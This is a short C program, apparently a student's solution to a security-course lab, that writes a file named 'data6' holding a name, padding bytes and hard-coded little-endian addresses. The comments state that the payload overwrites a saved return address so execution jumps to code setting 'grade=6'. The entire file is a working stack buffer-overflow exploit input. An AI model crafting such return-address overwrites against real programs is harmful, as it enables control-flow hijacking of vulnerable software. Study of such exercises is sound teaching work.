#include <stdio.h>
#include<stdlib.h>

int main(){
	int i=0;

	FILE * fp=fopen("data6","w");
	if(fp==NULL) exit(EXIT_FAILURE);
	fprintf(fp,"Nasia Boubouraki");
	fputc('\0',fp);/*17*/
	for(i=0;i<17;i++){
		fputc('*',fp);
	}
	
	fputc(50,fp);
	
	/*make return go to grade=6 in main 0x8049e8e*/
	fputc(0x8e,fp);
	fputc(0x9e,fp);
	fputc(0x04,fp);
	fputc(0x08,fp);

	/*name*/
	fputc(0xdc,fp);
	fputc(0x42,fp);
	fputc(0x0e,fp);
	fputc(0x08,fp);

	fclose(fp);

	return 0;

}
